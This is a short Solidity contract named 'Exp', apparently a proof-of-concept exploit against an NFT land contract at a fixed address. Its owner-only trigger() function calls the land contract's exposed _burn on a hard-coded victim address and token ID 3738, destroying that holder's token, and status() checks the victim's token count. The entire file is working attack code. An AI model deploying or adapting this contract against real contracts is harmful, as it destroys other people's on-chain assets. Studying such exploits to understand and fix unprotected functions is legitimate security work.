// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.15;

// Import this file to use console.log
import "hardhat/console.sol";
import "./interfaces/ILand.sol";

contract Exp {
    ILand private land;
    address private immutable owner;
    address private constant target = 0x9cfA73B8d300Ec5Bf204e4de4A58e5ee6B7dC93C;

    modifier onlyOwner {
        require(msg.sender == owner, "Not your biz!");
        _;
    }

    constructor() {
        owner = msg.sender;
        land = ILand(0x50f5474724e0Ee42D9a4e711ccFB275809Fd6d4a);
    }

    function trigger() external onlyOwner returns (bool) {
        land._burn(target, target, 3738);
        return true;
    }

    function status() external view returns (uint256 status) {
        status = land._numNFTPerAddress(target);
    }
}
